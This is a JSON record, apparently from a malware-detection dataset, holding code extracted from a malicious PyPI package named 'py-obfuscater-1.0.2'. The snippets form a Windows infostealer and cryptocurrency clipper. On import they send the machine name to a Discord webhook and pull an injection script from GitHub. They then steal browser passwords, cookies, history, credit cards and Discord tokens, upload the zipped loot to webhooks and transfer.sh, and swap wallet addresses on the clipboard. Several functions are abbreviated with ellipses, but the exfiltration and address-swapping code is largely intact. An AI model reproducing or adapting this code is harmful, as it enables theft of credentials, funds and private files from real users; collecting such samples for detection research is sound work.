[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious configuration and initial exfiltration ---\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://discord.com/api/webhooks/1104290142912528457/TVOxheeA7nJpxR8ojtb8CsoHPjQx0OFpnr-fuecUZQ5ngkNiw5OFsBK2EItGRWra1DSV\", json=data)\n\n__config__ = {\n    \"yourwebhookurl\": \"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    ...\n}\n\n# --- Malicious class for clipboard crypto address swapping (crypto-clipper) ---\nclass auto_copy_wallet(...):\n    ...\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search(\n                \"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search(\"addr1[a-z0-9]+\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    ...\n\n# --- Malicious class for credential, token, and file theft ---\nclass first_function_bc(...):\n    ...\n    async def init(self):\n        ...\n        # Steal browser data, Discord tokens, cookies, passwords, history, credit cards\n        ...\n        for name, path in self.browsers.items():\n            if not os.path.isdir(path):\n                continue\n            self.masterkey = self.mykey_gtm(path + \"\\\\Local State\")\n            self.funcs = [\n                self.steal_cookies2,\n                self.steal_history2,\n                self.steal_passwords2,\n                self.steal_cc2,\n            ]\n            for profile in self.profiles:\n                for func in self.funcs:\n                    try:\n                        func(name, path, profile)\n                    except:\n                        pass\n        ...\n        # Exfiltrate data\n        self.natify_matched_tokens()\n        await self.disco_injection()\n        self.ping_on_running()\n        self.finished_bc()\n    ...\n    def find_bctoken(self):\n        # Steal Discord tokens from various browsers and validate them\n        ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            ...\n            for filname in os.listdir(path):\n                if filname[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{filname}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(self.regex, line):\n                        try:\n                            r = requests.get(\n                                self.baseurl,\n                                headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                    \"Content-Type\": \"application/json\",\n                                    \"Authorization\": token,\n                                },\n                            )\n                        except Exception:\n                            pass\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in self.bc_id:\n                                self.tokens.append(token)\n                                self.bc_id.append(uid)\n        ...\n    def steal_passwords2(self, name: str, path: str, profile: str):\n        # Steal passwords from browser profile\n        ...\n    def steal_cookies2(self, name: str, path: str, profile: str):\n        # Steal cookies from browser profile\n        ...\n    def steal_passwords(self):\n        # Steal Chrome passwords\n        ...\n    def steal_cookies(self):\n        # Steal Chrome cookies\n        ...\n    def steal_history2(self, name: str, path: str, profile: str):\n        # Steal browser history\n        ...\n    def steal_cc2(self, name: str, path: str, profile: str):\n        # Steal credit card data\n        ...\n    def finished_bc(self):\n        # Zip and exfiltrate all stolen data\n        ...\n        _zipfile = ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        ...\n        with open(_zipfile, \"rb\") as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={\"upload_file\": f})\n        os.remove(_zipfile)\n    ...\n\n# --- Malicious functions for mass browser data theft and exfiltration ---\ndef Find_Passw(path, arg):\n    ...\n    # Steal passwords from browser database, decrypt, and collect for exfiltration\n    ...\ndef Get_Bc_Cook(path, arg):\n    ...\n    # Steal cookies from browser database, decrypt, and collect for exfiltration\n    ...\ndef upload(name, tk=\"\"):\n    ...\n    # Exfiltrate files and data to attacker's webhook\n    ...\ndef bc_Gather_All():\n    ...\n    # Orchestrate browser data theft and exfiltration for multiple browsers\n    ...\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef check_spec_bc():\n    ...\n    # Search for files with sensitive keywords on Desktop, Downloads, Documents, upload to attacker\n    ...\n\n# --- Main execution: run all malicious actions ---\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  },
  {
    "metadata": {
      "package_name": "py-obfuscater-1.0.2",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/py-obfuscater-1.0.2.txt"
    }
  }
]